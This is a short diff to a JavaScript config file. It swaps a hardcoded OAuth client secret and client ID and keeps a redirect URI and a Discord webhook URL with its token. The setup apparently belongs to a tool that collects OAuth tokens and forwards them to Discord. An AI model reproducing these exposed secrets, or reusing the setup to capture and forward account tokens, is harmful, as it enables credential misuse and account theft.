@@ -1,6 +1,6 @@
 //Change these btw
-const client_secret = 'Et18Q~8allVlX1R6QXZCiQOQ5nz5Jol1Q3yfjaCv' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = '82533e0f-9790-4fc6-b631-442b139fbe6b'
+const client_secret = '9JN8Q~Wun_t7bUSTNk74VsLTQfPBo4bTWwpavcHe' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = 'bf93c632-be5e-43b8-a53e-85b4d79c79a3'
 const redirect_uri = 'https://oauth-blb2.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1049343570907234385/tUm1IthkDcs1BcDWBT57Qn_XP1eZU3A-SFUDL9IZwws_jvB4GmFE2GhIOHS0sL7Uvw7c'
 
